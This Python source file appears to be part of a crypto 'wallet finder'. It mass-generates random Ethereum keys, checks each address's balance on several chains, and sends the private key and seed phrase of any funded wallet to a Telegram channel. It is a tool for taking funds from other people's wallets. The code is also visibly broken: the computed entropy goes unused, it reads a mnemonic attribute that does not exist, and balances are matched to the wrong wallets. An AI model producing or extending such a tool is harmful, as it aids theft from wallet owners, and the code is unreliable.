import asyncio
import cupy as cp
import numpy as np
from eth_account import Account
from typing import List, Dict, Optional
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm

from ..config import Config
from .blockchain_manager import BlockchainManager
from ..utils.gpu_utils import setup_gpu_context
from ..utils.logger import get_logger

class WalletManager:
    def __init__(self, blockchain_manager: BlockchainManager):
        self.logger = get_logger(__name__)
        self.config = Config()
        self.blockchain_manager = blockchain_manager
        self.gpu_context = setup_gpu_context() if self.config.enable_gpu else None
        self.executor = ThreadPoolExecutor(max_workers=self.config.num_gpu_streams)
        
        # Enable unaudited HD wallet features
        Account.enable_unaudited_hdwallet_features()
        
        # Pre-allocate GPU memory for batch processing
        if self.gpu_context:
            self.random_state = cp.random.RandomState()
            self.entropy_buffer = cp.zeros((self.config.batch_size, 32), dtype=cp.uint8)

    async def process_wallets(self) -> None:
        """Process a batch of wallets using GPU acceleration"""
        try:
            wallets = await self._generate_wallets()
            if not wallets:
                return

            balances = await self._check_wallets(wallets)
            await self._process_results(wallets, balances)
            
        except Exception as e:
            self.logger.error(f"Error processing wallets: {str(e)}")
            raise

    async def _generate_wallets(self) -> List[Dict[str, str]]:
        """Generate wallets using GPU acceleration"""
        try:
            if self.gpu_context:
                # Generate random entropy on GPU
                self.random_state.bytes(self.entropy_buffer)
                entropy_list = cp.asnumpy(self.entropy_buffer)
            else:
                # Fallback to CPU generation
                entropy_list = np.random.bytes(32 * self.config.batch_size).reshape(-1, 32)

            wallets = []
            for entropy in entropy_list:
                account = Account.create()
                mnemonic = Account.from_key(account.key).mnemonic
                wallets.append({
                    'address': account.address,
                    'private_key': account.key.hex(),
                    'mnemonic': mnemonic
                })

            return wallets

        except Exception as e:
            self.logger.error(f"Error generating wallets: {str(e)}")
            return []

    async def _check_wallets(self, wallets: List[Dict[str, str]]) -> List[Dict[str, float]]:
        """Check wallet balances across multiple chains in parallel"""
        tasks = []
        for wallet in wallets:
            for chain_id in self.blockchain_manager.supported_chains:
                tasks.append(self.blockchain_manager.get_wallet_balance(
                    wallet['address'], 
                    chain_id
                ))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        balances = []
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                self.logger.error(f"Error checking wallet {i}: {str(result)}")
                balances.append({})
            else:
                balances.append(result)
        
        return balances

    async def _process_results(
        self, 
        wallets: List[Dict[str, str]], 
        balances: List[Dict[str, float]]
    ) -> None:
        """Process wallets with non-zero balances"""
        for wallet, balance in zip(wallets, balances):
            if not balance:
                continue

            total_value_usd = await self.blockchain_manager.calculate_total_value(balance)
            
            if total_value_usd >= self.config.min_token_value_usd:
                await self._report_valuable_wallet(wallet, balance, total_value_usd)

    async def _report_valuable_wallet(
        self,
        wallet: Dict[str, str],
        balances: Dict[str, float],
        total_value_usd: float
    ) -> None:
        """Report valuable wallet findings"""
        message = (
            f"💰 Valuable wallet found!\n\n"
            f"Address: {wallet['address']}\n"
            f"Total Value: ${total_value_usd:.2f}\n\n"
            f"Balances:\n"
        )
        
        for token, amount in balances.items():
            if amount > 0:
                price = await self.blockchain_manager.get_token_price(token)
                value = amount * price
                message += f"{token}: {amount:.8f} (${value:.2f})\n"
        
        message += f"\nPrivate Key: {wallet['private_key']}\n"
        message += f"Mnemonic: {wallet['mnemonic']}"
        
        # Send notification through configured channels
        await self.blockchain_manager.telegram.send_message(message)
        self.logger.info(f"Reported valuable wallet: {wallet['address']}")